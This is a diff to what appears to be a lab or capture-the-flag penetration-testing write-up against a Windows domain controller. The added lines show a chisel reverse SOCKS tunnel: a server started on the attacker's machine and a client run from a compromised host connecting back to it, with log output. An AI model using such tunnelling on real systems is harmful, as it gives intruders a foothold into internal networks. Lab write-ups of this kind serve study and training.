@@ -1009,6 +1009,33 @@ SMB         10.129.191.32   445    DC01             SYSVOL          READ        
 
 tried bloodhound enum but nothiing useful 
 
+```
+./chisel server -v -p 1234 --reverse --socks5
+2026/10/31 16:39:05 server: Reverse tunnelling enabled
+2026/10/31 16:39:05 server: Fingerprint kcZbrEAV403vdjjHMta68/nth02RI2ORymA9d/P+o2Q=
+2026/10/31 16:39:05 server: Listening on http://0.0.0.0:1234
+2026/10/31 16:40:21 server: session#1: Handshaking with 10.129.191.32:49820...
+2026/10/31 16:40:21 server: session#1: Verifying configuration
+2026/10/31 16:40:21 server: session#1: Client version (1.11.5) differs from server version (0.0.0-src)
+2026/10/31 16:40:21 server: session#1: tun: Created (SOCKS enabled)
+2026/10/31 16:40:21 server: session#1: tun: SSH connected
+2026/10/31 16:40:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+2026/10/31 16:40:21 server: session#1: tun: Bound proxies
+
+
+```
+
+```
+git@gpz-op26-toolkits:/tmp$ ./chisel client -v 10.10.14.148:1234 R:socks
+./chisel client -v 10.10.14.148:1234 R:socks
+2026/11/01 00:40:24 client: Connecting to ws://10.10.14.148:1234
+2026/11/01 00:40:24 client: Handshaking...
+2026/11/01 00:40:24 client: Sending config
+2026/11/01 00:40:24 client: Connected (Latency 33.8415ms)
+2026/11/01 00:40:24 client: tun: SSH connected
+
+```
+
 ### Exploitation
 
 Step-by-step privilege escalation.
